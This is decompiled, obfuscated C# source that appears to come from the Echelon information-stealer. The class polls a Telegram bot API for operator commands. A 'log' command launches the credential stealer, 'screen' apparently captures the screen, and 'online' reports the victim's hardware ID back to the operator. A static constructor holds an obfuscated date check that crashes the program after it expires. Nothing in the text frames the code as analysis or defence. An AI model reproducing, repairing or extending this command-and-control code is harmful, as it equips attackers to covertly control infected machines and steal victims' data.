using Echelon;
using SimpleJSON;
using System;
using System.IO;
using System.Net;
using System.Threading;

internal class h
{
	private static int m_a;

	public static string a()
	{
		while (true)
		{
			try
			{
				JSONNode.Enumerator enumerator = JSON.Parse(b(Global.ApiUrl + g.d + "/getUpdates?offset=" + (h.m_a + 1)))["result"].AsArray.GetEnumerator();
				while (enumerator.MoveNext())
				{
					JSONNode jSONNode = enumerator.Current;
					h.m_a = jSONNode["update_id"].AsInt;
					string text = jSONNode["message"]["text"];
					if (text.IndexOf(Global.GetHwid()) > -1 || text.IndexOf("All") > -1)
					{
						switch (text.Split(':')[0])
						{
						case "log":
							Stealer.Start();
							break;
						case "screen":
							bc.a();
							break;
						}
					}
					if (text == "online")
					{
						b(string.Concat(Global.ApiUrl, g.d, "/sendMessage?", "chat_id=", jSONNode["message"]["chat"]["id"], "&text=", "\ud83d\udc41\u200d\ud83d\udde8 Online: ", Global.GetHwid()));
					}
				}
				Thread.Sleep(g.a);
			}
			catch
			{
			}
		}
	}

	private static string b(string aa)
	{
		ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
		try
		{
			return new StreamReader(WebRequest.Create(aa).GetResponse().GetResponseStream()).ReadToEnd();
		}
		catch
		{
			return new StreamReader(WebRequest.Create(aa).GetResponse().GetResponseStream()).ReadToEnd();
		}
	}

	static h()
	{
		DateTime d = new DateTime(-365848436 - -365850456, ~433677845 + 433677850 >> 2 << 2, -(-455244410 ^ -289708140) + -247060347 - -421575058);
		if ((d - DateTime.Now).TotalDays < 0.0)
		{
			int num = --520657677 + -520657677;
			num = (~-239818770 - 239818768) / num;
		}
	}
}
